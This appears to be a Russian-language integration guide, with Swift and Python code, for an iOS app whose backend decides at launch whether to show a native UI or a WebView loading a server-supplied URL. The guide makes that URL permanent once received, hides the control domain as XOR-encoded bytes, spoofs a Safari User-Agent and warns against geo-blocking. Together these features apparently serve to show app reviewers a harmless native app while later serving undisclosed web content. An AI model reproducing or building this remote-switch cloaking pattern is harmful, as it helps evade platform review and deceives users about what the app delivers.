# Интеграция логики WebView

Приложение на старте спрашивает бэкенд: показать WebView или нативный UI. Ответ кэшируется. Если URL уже был получен хоть раз — WebView открывается сразу и больше не сбрасывается.

---

## 1. Режимы

```swift
enum DisplayMode {
    case loading
    case webContent
    case nativeInterface
}
```

| Режим | UI |
|---|---|
| `loading` | лоадер, ≤5с |
| `webContent` | `WKWebView` с сохранённым/новым URL |
| `nativeInterface` | обычное приложение |

---

## 2. API

`POST {BASE_URL}/api/v1/users/register`

```json
{ "bundle": "com.example.app", "push_token": "" }
```

```json
{ "success": true, "app_data": "https://example.com/content" }
```

`app_data` считается валидным только если `success == true` и строка непустая.

Заголовки: `Content-Type` / `Accept` = `application/json`.  
`User-Agent` — Safari (см. §7), иначе часть сайтов отдаёт `403`.

Таймаут сессии: **8–10с** (`timeoutIntervalForRequest` и `timeoutIntervalForResource`). Не оставлять дефолтные 30с+.

---

## 3. Решение

**Кэша нет** (первый запуск):

| Ответ | Режим |
|---|---|
| `success` + непустой `app_data` | WebView, URL пишется в кэш |
| пустой `app_data` / `success: false` | native |
| ошибка / таймаут / домен недоступен | native |

**Кэш есть** (URL уже приходил):

| Ответ | Режим |
|---|---|
| новый `app_data` | WebView, кэш обновляется |
| пустой / ошибка / таймаут | WebView со **старым** URL |

Пустой ответ **никогда** не затирает кэш и **никогда** не сбрасывает на native.

---

## 4. Кэш URL

`UserDefaults`. Писать только непустой URL. Читать на старте **до** сети.

```swift
final class ContentURLCache {
    static let shared = ContentURLCache()
    private let key = "content_url"

    var url: String? {
        get { UserDefaults.standard.string(forKey: key) }
        set {
            if let value = newValue, !value.isEmpty {
                UserDefaults.standard.set(value, forKey: key)
            }
        }
    }

    func save(_ url: String?) {
        guard let url, !url.isEmpty else { return }
        self.url = url
    }
}
```

Рекомендация: не хранить plaintext — XOR/шифровать значение и имя ключа. Ключ шифрования лучше считать из `Bundle.main.bundleIdentifier`, чтобы кэш не читался между приложениями.

---

## 5. Старт (канон)

Лоадер снимается **первым** из трёх событий. Сеть UI не блокирует.

```
isInitializing = true

1. если cache.url непустой → сразу WebView
2. через 5с → native, если ещё isInitializing
3. POST register → WebView или native

finishLaunch(mode, url):
  guard isInitializing else { return }
  показать UI
  isInitializing = false
```

```swift
@main
struct AppNameApp: App {
    @State private var isInitializing = true
    @State private var displayMode: DisplayMode = .loading
    @State private var webContentURL: String?

    var body: some Scene {
        WindowGroup {
            rootView.onAppear { start() }
        }
    }

    @ViewBuilder
    private var rootView: some View {
        ZStack {
            if isInitializing {
                ProgressView()
            } else if displayMode == .webContent, let url = webContentURL {
                let fullURL = url.hasPrefix("http") ? url : "https://\(url)"
                ZStack {
                    Color.black.ignoresSafeArea()
                    WebContentView(url: fullURL)
                }
                .preferredColorScheme(.dark)
            } else {
                NativeRootView()
            }
        }
    }

    private func start() {
        if let saved = ContentURLCache.shared.url, !saved.isEmpty {
            finishLaunch(mode: .webContent, url: saved)
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            finishLaunch(mode: .nativeInterface, url: nil)
        }

        RegistrationService.shared.register { mode, url in
            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
        }
    }

    private func finishLaunch(mode: DisplayMode, url: String?) {
        guard isInitializing else { return }
        displayMode = mode
        webContentURL = url
        isInitializing = false
    }
}
```

Следствия:

- сохранённый URL не перебивается watchdog (`isInitializing` уже `false`)
- native с таймера — только если URL не было никогда
- недоступный домен ≠ зависание

---

## 6. Регистрация

```swift
struct RegistrationResponse: Decodable {
    let success: Bool
    let app_data: String?

    var contentURL: String? {
        guard success, let app_data, !app_data.isEmpty else { return nil }
        return app_data
    }
}

final class RegistrationService {
    static let shared = RegistrationService()

    private let session: URLSession = {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 10
        config.timeoutIntervalForResource = 10
        return URLSession(configuration: config)
    }()

    func register(pushToken: String = "", completion: @escaping (DisplayMode, String?) -> Void) {
        guard let url = URL(string: APIConfig.endpoint) else {
            completion(.nativeInterface, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.setValue(APIConfig.safariUserAgent, forHTTPHeaderField: "User-Agent")
        request.httpBody = try? JSONEncoder().encode([
            "bundle": Bundle.main.bundleIdentifier ?? "",
            "push_token": pushToken
        ])

        session.dataTask(with: request) { data, response, error in
            let http = response as? HTTPURLResponse
            let ok = (200..<300).contains(http?.statusCode ?? 0)
            let parsed = data.flatMap { try? JSONDecoder().decode(RegistrationResponse.self, from: $0) }

            if ok, let contentURL = parsed?.contentURL {
                ContentURLCache.shared.save(contentURL)
                completion(.webContent, contentURL)
            } else {
                completeWithCacheOrNative(completion)
            }
        }.resume()
    }

    private func completeWithCacheOrNative(_ completion: (DisplayMode, String?) -> Void) {
        if let cached = ContentURLCache.shared.url, !cached.isEmpty {
            completion(.webContent, cached)
        } else {
            completion(.nativeInterface, nil)
        }
    }
}
```

---

## 7. WebView

UA обязан содержать `Version/X.Y` и `Safari/604.1`. Ставить `customUserAgent` на экземпляр, не swizzle `WKWebView`.

```
Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
```

Требования к `WKWebView`:

- `allowsInlineMediaPlayback = true`
- жесты назад включены
- `target=_blank` грузить в том же webview
- JS `alert` / `confirm` через `UIAlertController`
- top = safe area
- снаружи: чёрный `ignoresSafeArea` + `.preferredColorScheme(.dark)`

```swift
webView.customUserAgent = APIConfig.safariUserAgent
```

---

## 8. Endpoint без plaintext

Домен не хранить открытой строкой. XOR-фрагменты, сборка в рантайме:

```python
# encode-string.py
KEY = [0xA7, 0x3E, 0x91, 0x5C, 0xD2]
print([ord(c) ^ KEY[i % 5] for i, c in enumerate("https://api.example.com")])
print([ord(c) ^ KEY[i % 5] for i, c in enumerate("/api/v1/users/register")])
```

```swift
enum APIConfig {
    private static let key: [UInt8] = [0xA7, 0x3E, 0x91, 0x5C, 0xD2]
    private static let host: [UInt8] = [/* вывод скрипта */]
    private static let path: [UInt8] = [/* вывод скрипта */]

    static var endpoint: String { reveal(host) + reveal(path) }

    static let safariUserAgent =
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"

    private static func reveal(_ bytes: [UInt8]) -> String {
        String(bytes: bytes.enumerated().map { $1 ^ key[$0 % key.count] }, encoding: .utf8) ?? ""
    }
}
```

`APIConfig` инициализировать до первого запроса.

---

## 9. Порядок

```
launch
  1. собрать endpoint из XOR-байтов
  2. onAppear:
       кэш → сразу WebView
       watchdog 5с → native если ещё ждём
       POST register
  3. первое событие рисует UI
```

---

## 10. Правила

1. Лоадер снимается по таймеру независимо от сети.
2. Sticky URL: пустой/упавший ответ не затирает кэш.
3. Нет кэша + ошибка → native, приложение работает без бэкенда.
4. Есть кэш + ошибка → старый WebView.
5. UA: `Version/X.Y` + `Safari/604.1`, без swizzle.
6. Домен API без гео-блока — иначе из другой страны всегда native.
